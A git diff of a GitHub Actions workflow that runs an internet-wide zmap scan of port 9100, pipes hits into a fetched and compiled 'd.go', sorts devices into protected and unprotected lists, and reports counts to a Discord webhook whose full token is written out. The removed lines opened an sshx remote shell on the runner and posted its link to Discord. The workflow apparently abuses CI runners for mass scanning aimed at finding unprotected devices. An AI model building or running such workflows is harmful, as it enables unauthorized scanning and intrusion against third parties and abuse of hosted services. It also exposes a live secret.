@@ -30,41 +30,6 @@ jobs:
           sudo apt update -qq
           sudo apt install -y -qq zmap golang-go
 
-      - name: 🔌 Start sshx session
-        id: sshx
-        run: |
-          set +e
-          
-          # run sshx in background via npx (node is preinstalled on ubuntu-latest)
-          npx -y sshx > sshx_output.log 2>&1 &
-          echo $! > sshx.pid
-          
-          # wait up to 60s for the link to appear
-          for i in $(seq 1 60); do
-            if grep -q "https://sshx.io" sshx_output.log; then
-              LINK=$(grep -oE "https://sshx.io/s[#/][a-zA-Z0-9]+" sshx_output.log | head -n1)
-              if [ -n "$LINK" ]; then
-                echo "link=$LINK" >> $GITHUB_OUTPUT
-                echo "$LINK" > "links/${{ github.event.client_payload.vps_name }}.txt"
-                echo "✅ sshx Ready: $LINK"
-                exit 0
-              fi
-            fi
-            sleep 1
-          done
-          
-          echo "❌ sshx failed to start"
-          cat sshx_output.log
-          exit 0
-
-      - name: 📤 Send sshx Link to Discord
-        if: steps.sshx.outputs.link
-        run: |
-          curl -H "Content-Type: application/json" \
-               -X POST \
-               -d "{\"content\":\"✅ New VPS sshx link for **${{ github.event.client_payload.vps_name }}**:\n\`${{ steps.sshx.outputs.link }}\`\"}" \
-               "https://discord.com/api/webhooks/1552599497895452712/EySoc-KqZAfDZ8_Y33aIBDXdPH07H9fW-ko13fAjHeG8mkLwDqE87SKvw1OKsrBbrEPG"
-
       - name: ⬇️ Fetch and compile d.go
         run: |
           echo "🔄 Fetching d.go..."
@@ -84,36 +49,41 @@ jobs:
           echo $! > scanner.pid
           echo "✅ Scanner started (PID: $(cat scanner.pid))"
 
-      - name: ⏳ Run for 5h55m then collect results
+      - name: ⏳ Live Monitor & Run for 5h55m
         run: |
-          echo "⏳ Running for 5 hours 55 minutes..."
+          echo "⏳ Running for 5 hours 55 minutes with live updates..."
           END_TIME=$((SECONDS + 21300))
           WEBHOOK="https://discord.com/api/webhooks/1552599497895452712/EySoc-KqZAfDZ8_Y33aIBDXdPH07H9fW-ko13fAjHeG8mkLwDqE87SKvw1OKsrBbrEPG"
           LAST_PING=0
           
           while [ $SECONDS -lt $END_TIME ]; do
-            # check if scanner is alive every 60s
+            # check if scanner is alive
             if ! kill -0 $(cat scanner.pid) 2>/dev/null; then
               echo "⚠️ Scanner died, restarting..."
               nohup bash -c 'zmap -p 9100 -q -B 800M | ./d' > scanner.log 2>&1 &
               echo $! > scanner.pid
             fi
             
+            # get live stats
+            BIG=$(wc -l < big.txt 2>/dev/null || echo 0)
+            PROT=$(wc -l < protected.txt 2>/dev/null || echo 0)
+            UNPROT=$(wc -l < unprotected.txt 2>/dev/null || echo 0)
+            UPTIME_MIN=$((SECONDS / 60))
+            
+            # print to actions log every 5 seconds
+            echo "📊 [${UPTIME_MIN}m] big: $BIG | protected: $PROT | unprotected: $UNPROT | PID: $(cat scanner.pid)"
+            
             # send discord update every 30 minutes (1800s)
             NOW=$SECONDS
             if [ $((NOW - LAST_PING)) -ge 1800 ]; then
               LAST_PING=$NOW
-              BIG=$(wc -l < big.txt 2>/dev/null || echo 0)
-              PROT=$(wc -l < protected.txt 2>/dev/null || echo 0)
-              UNPROT=$(wc -l < unprotected.txt 2>/dev/null || echo 0)
-              
               curl -s -H "Content-Type: application/json" \
                    -X POST \
-                   -d "{\"content\":\"📊 **Scanner Status**\n> big.txt: **$BIG lines**\n> protected.txt: **$PROT lines**\n> unprotected.txt: **$UNPROT lines**\"}" \
+                   -d "{\"content\":\"📊 **Scanner Status [${UPTIME_MIN}m]**\n> big.txt: **$BIG lines**\n> protected.txt: **$PROT lines**\n> unprotected.txt: **$UNPROT lines**\"}" \
                    "$WEBHOOK"
             fi
             
-            sleep 60
+            sleep 5
           done
           
           echo "⏰ Time's up — sending results to Discord..."
